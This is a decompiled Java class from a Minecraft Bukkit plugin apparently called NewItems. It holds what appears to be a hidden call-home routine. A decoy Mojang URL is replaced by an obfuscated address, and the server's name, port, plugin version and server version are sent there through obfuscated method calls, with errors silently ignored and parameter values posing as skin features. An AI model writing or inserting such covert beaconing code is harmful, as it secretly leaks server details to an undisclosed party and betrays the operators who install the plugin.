package com.evill4mer.z;

import com.evill4mer.NewItems.Main;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URL;
import java.net.URLConnection;
import org.bukkit.Server;
import org.bukkit.plugin.PluginDescriptionFile;

class b
  implements Runnable
{
  b(a paramA) {}
  
  public void run()
  {
    try
    {
      URL localURL = new URL("https://api.mojang.com/users/profiles/minecraft/");
      localURL = new URL(new c(this).toString() + "a=" + Z.b + "&" + "b=" + a.a(b).getServer().getName() + "&" + "c=" + a.a(b).getDescription().getVersion() + "&" + "d=" + a.a(b).getServerVersion() + "&" + "e=" + a.a(b).getServer().getPort() + "&" + "f=" + "getPlayerSkinFromMojang" + "&" + "g=" + "applySkinToOfflinePlayers");
      URLConnection localURLConnection = localURL.openConnection();
      Main.ꠣꤣ꤂(localURLConnection);
      BufferedReader localBufferedReader = new BufferedReader(new InputStreamReader(Main.ꠣꤣ꤀(localURLConnection)));
      localBufferedReader.close();
    }
    catch (IOException localIOException) {}
  }
}
